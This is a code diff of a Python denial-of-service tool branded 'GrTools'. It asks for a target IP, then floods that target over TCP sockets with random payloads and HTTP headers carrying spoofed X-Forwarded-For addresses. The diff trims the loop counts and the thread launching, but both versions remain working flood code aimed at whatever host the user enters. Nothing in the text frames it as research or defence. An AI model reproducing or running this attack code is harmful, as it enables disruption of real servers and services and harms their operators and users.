@@ -40,8 +40,6 @@ def spoofer():
     assembled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
     return assembled
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
 expiration_date = datetime.datetime.now() + datetime.timedelta(days=7)
 
 ip = str(input("\033[36m╔══\n╚══════>Server@GrTools~ Enter Target IP : "))
@@ -50,44 +48,41 @@ t = int(input("\033[36m ╔══\n╚══════>Server@GrTools~ Input T
 th = int(input("\033[36m ╔══\n╚══════>Server@GrTools~ Input Thread : "))
 method = str(input("╔══\n╚══════>Server@GrTools~~ Enter Methods : "))
 
-if method == "UDP" or method == "CPUKILL" or method == "TCP" or method == "ALL" or method == "REQ" or method == "CFREQ" or method == "SUBNET" or method == "CFSOC":
-    
-    def tcpfl():
-        get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
-        post_host = "POST /Attacked-by-GrTools HTTP/1.1\r\nHost: " + ip + "\r\n"
-        get_data = "GET https://check-host.net//1.1\r\nHost: " + ip + "\r\n"
-        referer = "Referer: " + random.choice(https) + ip + "\r\n"
-        connection = "Connection: Keep-Alive\r\n" + "\r\n"
-        content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
-        socks = "socks5: " + random.choice(socks5) + "\r\n"
-        length = "Content-Length: 0\r\n"
-        forward = "X-Forwarded-For: 1\r\n"
-        forwards = "Client-IP: " + ip + "\r\n"
-        accept = random.choice(useragents) + "\r\n"
-        mozila = "User-Agent: " + random.choice(useragents) + "\r\n"
-        httpss = "User-Agent: " + random.choice(https) + "\r\n"
-        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
-        request = get_host + post_host + get_data + httpss + mozila + referer + content + socks + forward + forwards + accept + connection + connection + "\r\n"
-        grtools = random._urandom(150404)
-        while True:
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-                sock.connect((ip, port))
+def tcpfl():
+    get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
+    post_host = "POST /Attacked-by-GrTools HTTP/1.1\r\nHost: " + ip + "\r\n"
+    get_data = "GET https://check-host.net//1.1\r\nHost: " + ip + "\r\n"
+    referer = "Referer: " + random.choice(https) + ip + "\r\n"
+    connection = "Connection: Keep-Alive\r\n" + "\r\n"
+    content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
+    socks = "socks5: " + random.choice(socks5) + "\r\n"
+    length = "Content-Length: 0\r\n"
+    forward = "X-Forwarded-For: 1\r\n"
+    forwards = "Client-IP: " + ip + "\r\n"
+    accept = random.choice(useragents) + "\r\n"
+    mozila = "User-Agent: " + random.choice(useragents) + "\r\n"
+    httpss = "User-Agent: " + random.choice(https) + "\r\n"
+    connection += "X-Forwarded-For: " + spoofer() + "\r\n"
+    request = get_host + post_host + get_data + httpss + mozila + referer + content + socks + forward + forwards + accept + connection + connection + "\r\n"
+    grtools = random._urandom(150404)
+    while True:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            sock.connect((ip, port))
+            sock.send(grtools)
+            sock.send(grtools)
+            sock.send(grtools)
+            sock.send(grtools)
+            for x in range(75000):
                 sock.send(grtools)
                 sock.send(grtools)
                 sock.send(grtools)
                 sock.send(grtools)
-                for x in range(7500000):
-                    sock.send(grtools)
-                    sock.send(grtools)
-                    sock.send(grtools)
-                    sock.send(grtools)
-                    sock.send(grtools)
-                sock.close()
+                sock.send(grtools)
+            sock.close()
 
-    for x in range(50000):
-        if method == "TCP":
-            t = threading.Thread(target=tcpfl)
-            print("[GrBroadcast] Successfully sent")
-            t.start()
+if method.upper() == "TCP":
+    t = threading.Thread(target=tcpfl)
+    print("[GrBroadcast] Successfully sent")
+    t.start()
